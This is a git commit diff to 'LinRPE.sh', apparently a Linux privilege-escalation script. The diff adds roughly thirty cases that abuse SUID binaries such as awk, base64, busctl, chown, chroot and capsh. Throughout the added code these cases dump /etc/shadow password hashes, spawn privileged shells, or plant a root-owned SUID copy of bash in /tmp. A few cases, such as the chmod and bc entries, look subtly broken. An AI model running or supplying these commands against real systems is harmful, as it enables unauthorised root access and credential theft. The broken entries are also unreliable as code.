f14fbdd6ffbc16bbe3620e39fab35baae4754928
Herick-Costa <103023268+Herick-Costa@users.noreply.github.com>
2025-07-18 11:40:18 -0300

    Update LinRPE.sh

--- LinRPE.sh
+++ LinRPE.sh
@@ -52,6 +52,124 @@ for path in $SUIDS; do
             su zero
             id       
             ;;
+        arp)
+            echo "[+] $path → arp SUID encontrado! Teste:"
+            "$path" -v -f /etc/shadow
+            ;;
+        as)
+            echo "[+] $path → as SUID encontrado! Teste:"
+            LFILE=/etc/shadow
+            "$path" @$LFILE
+            ;;
+        ascii-xfr)
+            echo "[+] $path → ascii-xfr SUID encontrado! Teste:"
+            "$path" -ns /etc/shadow
+            ;;
+        ash)
+            echo "[+] $path → ash SUID encontrado! Teste:"
+            "$path" 
+            ;;
+        aspell)
+            echo "[+] $path → aspell SUID encontrado! Teste:"
+            "$path" -c /etc/shadow
+            ;;
+        atobm)
+            echo "[+] $path → atobm SUID encontrado! Teste:"
+            "$path" /etc/shadow 2>&1 | awk -F "'" '{printf "%s", $2}'
+            ;;
+        awk)
+            echo "[+] $path → awk SUID encontrado! Teste:"
+            "$path" '//' /etc/shadow
+            "$path" 'BEGIN {system("/bin/sh")}'
+            id
+            ;;
+        base32)
+            echo "[+] $path → base32 SUID encontrado! Teste:"
+            "$path" /etc/shadow | "$path" --decode
+            ;;
+        base64)
+            echo "[+] $path → base64 SUID encontrado! Teste:"
+            "$path" /etc/shadow | "$path" --decode
+            ;;
+        basenc)
+            echo "[+] $path → basenc SUID encontrado! Teste:"
+            "$path" --base64 /etc/shadow | "$path" -d --base64
+            ;;
+        basez)
+            echo "[+] $path → basez SUID encontrado! Teste:"
+            "$path" /etc/shadow | "$path" --decode
+            ;;
+        bc)
+            echo "[+] $path → bc SUID encontrado! Teste:"
+            "$path" -s /etc/shadow
+            quit
+            ;;
+        bridge)
+            echo "[+] $path → bridge SUID encontrado! Teste:"
+            "$path" -b /etc/shadow
+            ;;
+        busctl)
+            echo "[+] $path → busctl SUID encontrado! Teste:"
+            "$path" set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
+            ;;
+        busybox)
+            echo "[+] $path → busybox SUID encontrado! Teste:"
+            "$path" sh
+            ;;
+        bzip2)
+            echo "[+] $path → bzip2 SUID encontrado! Teste:"
+            "$path" -c /etc/shadow | "$path" -d
+            ;;
+        cabal)
+            echo "[+] $path → cabal SUID encontrado! Teste:"
+            "$path" exec -- /bin/sh -p
+            ;;
+        capsh)
+            echo "[+] $path → capsh SUID encontrado! Teste:"
+            "$path" --gid=0 --uid=0 --
+            ;;
+        cat)
+            echo "[+] $path → cat SUID encontrado! Teste:"
+            "$path" /etc/shadow
+            ;;
+        chmod)
+            echo "[+] $path → chmod SUID encontrado! Teste:"
+            "$path" chmod /etc/shadow
+            ;;
+        chown)
+            echo "[+] $path → chown SUID encontrado! Teste:"
+            cp /bin/bash /tmp/sh
+            "$path" root:root /tmp/sh
+            chmod +s /tmp/sh
+            /tmp/sh -p
+            ;;
+        choom)
+            echo "[+] $path → choom SUID encontrado! Teste:"
+            "$path" -n 0 -- /bin/sh -p
+            ;;
+        chroot)
+            echo "[+] $path → chroot SUID encontrado! Teste:"
+            "$path" / /bin/sh -p
+            ;;
+        clamscan)
+            echo "[+] $path → clamscan SUID encontrado! Teste:"
+            LFILE=/etc/shadow
+            TF=$(mktemp -d)
+            touch $TF/empty.yara
+            "$path" --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
+            ;;
+        cmp)
+            echo "[+] $path → cmp SUID encontrado! Teste:"
+            "$path" /etc/shadow /dev/zero -b -l
+            ;;
+        column)
+            echo "[+] $path → column SUID encontrado! Teste:"
+            "$path" /etc/shadow
+            ;;
+        comm)
+            echo "[+] $path → comm SUID encontrado! Teste:"
+            "$path" /etc/shadow /dev/null 2>/dev/null
+            ;;
         *)
             continue
             ;;
